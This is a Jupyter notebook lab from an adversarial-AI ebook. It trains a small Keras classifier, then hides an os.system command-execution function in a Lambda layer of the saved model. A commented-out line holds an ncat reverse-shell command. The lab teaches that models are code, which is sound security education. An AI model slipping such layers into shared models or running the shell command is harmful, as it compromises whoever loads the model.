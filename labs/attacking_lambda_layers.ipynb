{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7cae3042",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "27a7cf85",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(attacking_lambda_layers.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4c2fadf",
   "metadata": {},
   "source": [
    "### Model as code:   \n",
    "### Targeting Tensorflow and Keras - Lambda Layer   \n",
    "\n",
    "In this lab, we are targeting a model built with Tensorflow and Keras. \n",
    "\n",
    "While most of the labs we have dealt with so far and will be using throughout this course have focused on Scikit Learn for traditional machine learning and Pytorch for Deep Learning, make no mistake another very popular framework for deep learning is Tensorflow. It also uses the Keras library for higher level abstractions. Let's see how we can exploit Tensorflow and the two formats it typically saves the model in. Those formats are the HD5 and the SavedModel format.  \n",
    "\n",
    "Let start with building a simple Tensorflow model to inject\n",
    "\n",
    "https://hiddenlayer.com/innovation-hub/models-are-code/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2e8a6700",
   "metadata": {},
   "source": [
    "### Lab Objectives:  \n",
    "- Recognize that models are no different from other programs \n",
    "- Understand Tensorflow Lambda Layer\n",
    "- Understand how an adversary may leverage the Lambda layer to compromise an environment   \n",
    "\n",
    "\n",
    "### Step 1:  \n",
    "Get the data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "34636144",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the needed libraries\n",
    "import tensorflow as tf\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "56a339e3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[-] Disabling the GPU\n",
      "[*] Current logical devices: [LogicalDevice(name='/device:CPU:0', device_type='CPU')]\n",
      "[*] Current physical devices: [PhysicalDevice(name='/physical_device:GPU:0', device_type='GPU')]\n"
     ]
    }
   ],
   "source": [
    "# On my system, there is a compatibility issue between my Cuda and Tensorflow\n",
    "# As a result I disable the GPU by default for Tensorflow.\n",
    "# If Tensorflow is working fine on your system, then feel free to comment out the lines below\n",
    "\n",
    "# Comment out this line if your GPU works fine in Tensorflow \n",
    "print(f'[-] Disabling the GPU')\n",
    "tf.config.set_visible_devices(devices=[], device_type='GPU')\n",
    "\n",
    "print(f'[*] Current logical devices: {tf.config.list_logical_devices()}')\n",
    "print(f'[*] Current physical devices: {tf.config.list_physical_devices(device_type='GPU')}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "b6106916",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Tensorflow version used:  2.19.0\n",
      "Numpy version used:  2.1.3\n",
      "Pandas version used:  2.3.1\n"
     ]
    }
   ],
   "source": [
    "### Version of key libraries used  \n",
    "print(f'Tensorflow version used:  {tf.__version__}')\n",
    "print(f'Numpy version used:  {np.__version__}')\n",
    "print(f'Pandas version used:  {pd.__version__}')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "623fa045",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Duration</th>\n",
       "      <th>orig_bytes</th>\n",
       "      <th>resp_bytes</th>\n",
       "      <th>orig_pkts</th>\n",
       "      <th>orig_ip_bytes</th>\n",
       "      <th>resp_pkts</th>\n",
       "      <th>resp_ip_bytes</th>\n",
       "      <th>target</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0.000031</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>52</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0.000040</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>52</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0.000037</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>52</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0.000028</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>52</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0.000036</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>52</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7525</th>\n",
       "      <td>0.415875</td>\n",
       "      <td>88.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>2</td>\n",
       "      <td>144</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7526</th>\n",
       "      <td>0.000039</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>52</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7527</th>\n",
       "      <td>0.000017</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>52</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7528</th>\n",
       "      <td>0.011351</td>\n",
       "      <td>30.0</td>\n",
       "      <td>123.0</td>\n",
       "      <td>1</td>\n",
       "      <td>58</td>\n",
       "      <td>1</td>\n",
       "      <td>151</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7529</th>\n",
       "      <td>0.018702</td>\n",
       "      <td>30.0</td>\n",
       "      <td>123.0</td>\n",
       "      <td>1</td>\n",
       "      <td>58</td>\n",
       "      <td>1</td>\n",
       "      <td>151</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>7530 rows × 8 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "      Duration  orig_bytes  resp_bytes  orig_pkts  orig_ip_bytes  resp_pkts  \\\n",
       "0     0.000031         0.0         0.0          1             52          1   \n",
       "1     0.000040         0.0         0.0          1             52          1   \n",
       "2     0.000037         0.0         0.0          1             52          1   \n",
       "3     0.000028         0.0         0.0          1             52          1   \n",
       "4     0.000036         0.0         0.0          1             52          1   \n",
       "...        ...         ...         ...        ...            ...        ...   \n",
       "7525  0.415875        88.0         0.0          2            144          0   \n",
       "7526  0.000039         0.0         0.0          1             52          1   \n",
       "7527  0.000017         0.0         0.0          1             52          1   \n",
       "7528  0.011351        30.0       123.0          1             58          1   \n",
       "7529  0.018702        30.0       123.0          1             58          1   \n",
       "\n",
       "      resp_ip_bytes  target  \n",
       "0                40       0  \n",
       "1                40       0  \n",
       "2                40       0  \n",
       "3                40       0  \n",
       "4                40       0  \n",
       "...             ...     ...  \n",
       "7525              0       1  \n",
       "7526             40       0  \n",
       "7527             40       0  \n",
       "7528            151       0  \n",
       "7529            151       0  \n",
       "\n",
       "[7530 rows x 8 columns]"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Read some data\n",
    "# Nothing important here. Just getting some data for us to work through our problem\n",
    "df = pd.read_csv(filepath_or_buffer= r'../data/zeek_conn.log')\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "451aba65",
   "metadata": {},
   "source": [
    "Because our data has labels, we will make this problem into a supervised learning problem. Using the *target* column as our ... well you guessed it target :-) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "07c73b5c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Y has a shape of: (7530,)\n",
      "X has a shape of: (7530, 7)\n",
      "Mean of dataset: 42369.74027716632\n",
      "Std of dataset: 1923101.900001695\n"
     ]
    }
   ],
   "source": [
    "# Setup the labels\n",
    "y = df.loc[:, 'target'].values\n",
    "\n",
    "# Setup the targets\n",
    "X = df.drop(columns='target').values\n",
    "\n",
    "print(f'Y has a shape of: {y.shape}')\n",
    "print(f'X has a shape of: {X.shape}')\n",
    "print(f'Mean of dataset: {X.mean()}')\n",
    "print(f'Std of dataset: {X.std()}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4fc685fd",
   "metadata": {},
   "source": [
    "One thing we generally want to do, is scale our data before providing it to any neural network. That is assuming the data is not already scaled. There are different methods of scaling. For this problem, we will use the StandardScaler. No special reason. The objective is just to build models we can exploit, not about building models we can deploy.  Generally, we want to give the data a scale on a mean of 0 and a standard deviation of 1 or unit variance as it is otherwise called.  \n",
    "\n",
    "### Step 2:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "38831d8a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Scale the data\n",
    "from sklearn.preprocessing import StandardScaler"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "8334e1e7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Y has a shape of: (7530,)\n",
      "[*] X has a shape of: (7530, 7)\n",
      "[*] Mean of dataset: 1.3480226442043259e-18\n",
      "[*] Std of dataset: 1.0\n"
     ]
    }
   ],
   "source": [
    "# Remember, we are going through these steps so that we can see the problem from beginning to end. \n",
    "# Instantiate the scaler and fit/learn on the data\n",
    "scaler = StandardScaler(with_mean=True, with_std=True).fit(X=X)\n",
    "\n",
    "# Transform the data\n",
    "X = scaler.transform(X=X)\n",
    "\n",
    "# Let's revisit the information above about the X now that it has been scaled\n",
    "print(f'[*] Y has a shape of: {y.shape}')\n",
    "print(f'[*] X has a shape of: {X.shape}')\n",
    "print(f'[*] Mean of dataset: {X.mean()}')\n",
    "print(f'[*] Std of dataset: {X.std()}')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d7f51d20",
   "metadata": {},
   "source": [
    "With our data in place, we can now look to build our model. Once again, nothing special about the model or hyperparameters. Just putting together something we can exploit.  \n",
    "\n",
    "\n",
    "### Step 3:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "c65b02e6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"simple_model\"</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1mModel: \"simple_model\"\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)            │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">32</span>)             │           <span style=\"color: #00af00; text-decoration-color: #00af00\">256</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)           │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">64</span>)             │         <span style=\"color: #00af00; text-decoration-color: #00af00\">2,112</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │            <span style=\"color: #00af00; text-decoration-color: #00af00\">65</span> │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
       "</pre>\n"
      ],
      "text/plain": [
       "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (\u001b[38;5;33mDense\u001b[0m)            │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m32\u001b[0m)             │           \u001b[38;5;34m256\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (\u001b[38;5;33mDense\u001b[0m)           │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m64\u001b[0m)             │         \u001b[38;5;34m2,112\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (\u001b[38;5;33mDense\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │            \u001b[38;5;34m65\u001b[0m │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">2,433</span> (9.50 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m2,433\u001b[0m (9.50 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">2,433</span> (9.50 KB)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m2,433\u001b[0m (9.50 KB)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Set the seed to ensure we have the same results\n",
    "tf.keras.utils.set_random_seed(10)\n",
    "\n",
    "# Build a simple Tensorflow model for us \n",
    "# I am assuming here you know what each of these lines is doing\n",
    "# If you don't take a look at my series: https://www.securitynik.com/2023/05/beginning-machine-and-deep-learning.html\n",
    "model = tf.keras.Sequential(name='simple_model')\n",
    "model.add(tf.keras.layers.Input(shape=(X.shape[1], ), name='input_layer'))\n",
    "model.add(tf.keras.layers.Dense(units=32, activation='gelu', name='first_hidden'))\n",
    "model.add(tf.keras.layers.Dense(units=64, activation='gelu', name='second_hidden'))\n",
    "model.add(tf.keras.layers.Dense(units=1, activation='sigmoid', name='output'))\n",
    "model.summary()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "602cca2f",
   "metadata": {},
   "source": [
    "Visualizing is always an important step in machine learning. Let us further visualize our model architecture.   \n",
    "\n",
    "\n",
    "### Step 4:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "6fb362c5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "You must install pydot (`pip install pydot`) for `plot_model` to work.\n"
     ]
    }
   ],
   "source": [
    "# Let us visualize the model the model\n",
    "tf.keras.utils.plot_model(model=model, show_dtype=True, show_layer_activations=True, show_layer_names=True, show_shapes=True, show_trainable=True, dpi=75)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "677ea960",
   "metadata": {},
   "source": [
    "Time to compile the model and train the model  \n",
    "\n",
    "### Step 5:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "626a1cb3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch 1/2\n",
      "\u001b[1m189/189\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m4s\u001b[0m 10ms/step - accuracy: 0.8152 - loss: 0.5690 - val_accuracy: 0.7656 - val_loss: 0.5552\n",
      "Epoch 2/2\n",
      "\u001b[1m189/189\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m1s\u001b[0m 5ms/step - accuracy: 0.8342 - loss: 0.4412 - val_accuracy: 0.7656 - val_loss: 0.5531\n"
     ]
    }
   ],
   "source": [
    "# Compile the model\n",
    "model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])\n",
    "\n",
    "# Train the model\n",
    "# Not to worry about 2 epochs here for example. Remember, the objective is not about building a model for production\n",
    "# It is simply about understanding how adversarial AI is used to evade trained models\n",
    "# More importantly \"All models are wrong, some models are useful\" :-D\n",
    "history = model.fit(x=X, y=y, epochs=2, validation_split=.2, shuffle=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f81ea7d2",
   "metadata": {},
   "source": [
    "Visualizing our model's performance. Remember, nothing exciting to see here. We trained for two epochs and got an accuracy of 83%.  \n",
    "\n",
    "### Step 6:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "2404e40f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x500 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Plot the model's performance if you wish\n",
    "fig = plt.figure(figsize=(10,5))\n",
    "ax = fig.add_subplot(121)\n",
    "ax.set_title('Accuracy')\n",
    "ax.plot(history.history['accuracy'], label='training accuracy')\n",
    "ax.plot(history.history['val_accuracy'], label='val accuracy')\n",
    "ax.set_xlabel(xlabel='epochs')\n",
    "ax.set_ylabel(ylabel='probabilities / accuracy')\n",
    "ax.legend()\n",
    "\n",
    "ax = fig.add_subplot(122)\n",
    "ax.set_title('Loss')\n",
    "ax.plot(history.history['loss'], label='training loss')\n",
    "ax.plot(history.history['val_loss'], label='val loss')\n",
    "ax.set_xlabel(xlabel='epochs')\n",
    "ax.set_ylabel(ylabel='probabilities / accuracy')\n",
    "ax.legend()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2f802a3b",
   "metadata": {},
   "source": [
    "Save the load and validate it has been saved while reviewing the contents of the saved file.  \n",
    "\n",
    "### Step 7:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "1b22353b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Let's save the trained model\n",
    "tf.keras.models.save_model(model=model, filepath=r'/tmp/zeek_model.keras', overwrite=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "c69fbba1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/zeek_model.keras: Zip archive data, at least v2.0 to extract, compression method=store\n"
     ]
    }
   ],
   "source": [
    "# In the notes, we learned that the .keras format is a zip file, let us confirm\n",
    "# Below confirms it is a zip file\n",
    "!file /tmp/zeek_model.keras"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "1ebec576",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Archive:  /tmp/zeek_model.keras\n",
      "  Length      Date    Time    Name\n",
      "---------  ---------- -----   ----\n",
      "       64  1980-01-01 00:00   metadata.json\n",
      "     3387  1980-01-01 00:00   config.json\n",
      "    50848  2025-08-01 20:42   model.weights.h5\n",
      "---------                     -------\n",
      "    54299                     3 files\n"
     ]
    }
   ],
   "source": [
    "# let us list the contents of this file\n",
    "!unzip -l /tmp/zeek_model.keras"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "349359ff",
   "metadata": {},
   "source": [
    "Now let us load that saved model to make a prediction   \n",
    "\n",
    "### Step 8: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "1a391211",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 280ms/step\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.15068795]], dtype=float32)"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Similarly to what we learned in the notes, this file contains the model.weights.h5 file.\n",
    "# Let us load the model\n",
    "loaded_model = tf.keras.models.load_model(filepath='/tmp/zeek_model.keras')\n",
    "\n",
    "# make a prediction with the loaded model, to confirm it works as expected\n",
    "loaded_model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "46b2a46a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'malicious_payload>malicious_payload': <function __main__.malicious_payload(incoming_tensor, command)>}"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Get any previously registered custom objects\n",
    "# We need this here for what we are about to do\n",
    "# This should report none at this time\n",
    "tf.keras.utils.get_custom_objects()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f4db8f3",
   "metadata": {},
   "source": [
    "Time to setup the custom object and execute the the proof-of-concept code.\n",
    "\n",
    "### Step 9:  \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "3233f30b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Define a function to use with the lambda layer\n",
    "# If there were any previously registered custom objects, we can clear any previously registered custom objects as follow\n",
    "tf.keras.utils.get_custom_objects().clear()\n",
    "\n",
    "# To ensure this function is properly registered when saving the model, let's add this decorator\n",
    "@tf.keras.utils.register_keras_serializable(package=\"malicious_payload\", name=\"malicious_payload\")\n",
    "def malicious_payload(incoming_tensor, command):\n",
    "    '''\n",
    "    Lambda layer requires a function.\n",
    "    Args:\n",
    "        incoming_tensor (tensor): This is the tensor coming from the previous layer. \n",
    "                         We will not modify this. This should pass through\n",
    "        command (str):  The command we wish to execute\n",
    "    '''\n",
    "    # Import os because we would like the function to be self contained\n",
    "    import os\n",
    "\n",
    "    # Execute the command passed\n",
    "    os.system(command)\n",
    "    return incoming_tensor\n",
    "\n",
    "#malicious_payload()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "643089df",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'malicious_payload>malicious_payload': <function __main__.malicious_payload(incoming_tensor, command)>}"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "Revisit the registered objects.\n",
    "We should now see the objective is registered, because we used the decorator above\n",
    "Keep this registered object in mind as we will use it later\n",
    "However, to reuse it, we will also need to create the scenario again.\n",
    "We will deal with that scenario in due time\n",
    "'''\n",
    "tf.keras.utils.get_custom_objects()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "a81c0b32",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Lambda name=malicious_layer, built=False>"
      ]
     },
     "execution_count": 48,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Define he malicious lambda layer\n",
    "# Lambda layer: https://keras.io/api/layers/core_layers/lambda/\n",
    "\n",
    "# Here the command we will use is the *pwd*, this simply means to print the working directory\n",
    "malicious_layer = tf.keras.layers.Lambda(function=malicious_payload, name='malicious_layer', arguments={'command' : 'pwd'})\n",
    "\n",
    "# In the next run, we will use this. For now, stick with the line above\n",
    "#malicious_layer = tf.keras.layers.Lambda(function=malicious_payload, name='malicious_layer', arguments={'command' : 'ncat --verbose 127.0.0.1 9999 --exec /bin/sh --ssl &'})\n",
    "\n",
    "malicious_layer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "2344b487",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/mnt/d/Little Book on Adversarial AI/labs\n"
     ]
    }
   ],
   "source": [
    "'''\n",
    "Modify the stolen model\n",
    "Add the malicious layer to the pretrained model\n",
    "We also see the results printed from our command. \n",
    "Remember the command we specified was *pwd*\n",
    "pwd -> print working directory\n",
    "'''\n",
    "loaded_model.add(malicious_layer)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "16e5ea18",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"simple_model\"</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1mModel: \"simple_model\"\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)            │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">32</span>)             │           <span style=\"color: #00af00; text-decoration-color: #00af00\">256</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
